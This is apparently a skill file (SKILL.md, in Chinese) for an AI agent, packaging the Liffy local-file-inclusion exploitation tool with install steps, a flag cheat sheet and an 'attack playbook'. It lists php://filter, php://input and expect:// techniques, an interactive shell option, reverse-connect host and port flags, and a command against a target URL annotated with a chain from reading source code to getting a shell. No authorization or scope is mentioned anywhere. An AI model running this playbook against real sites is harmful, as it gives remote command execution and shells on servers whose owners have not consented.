---
name: liffy-lfi
description: 渗透工具 skill:Liffy 的安装、参数速查与攻击场景 playbook。当任务涉及 Web应用漏洞利用 需要调用 Liffy 时使用。
---

# Liffy

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/mzfr/liffy
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/mzfr/liffy && cd liffy && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python liffy.py -u 'https://t.com/?page='` | LFI 利用 |
| `--technique=data` | php://input |
| `--technique=filter` | php://filter |
| `--technique=expect` | expect:// |
| `-i` | 交互 shell |
| `--lhost x --lport 443` | 回连 |

## 攻击场景 Playbook

### LFI→RCE 链

```bash
python liffy.py -u 'https://target/index.php?page=' --technique=filter -i
# php://filter 读源码 → 找上传点 → 包含 getshell
```

## 注意事项

封装 LFI 经典利用链(filter/input/expect);新版加了内置 webshell 生成。
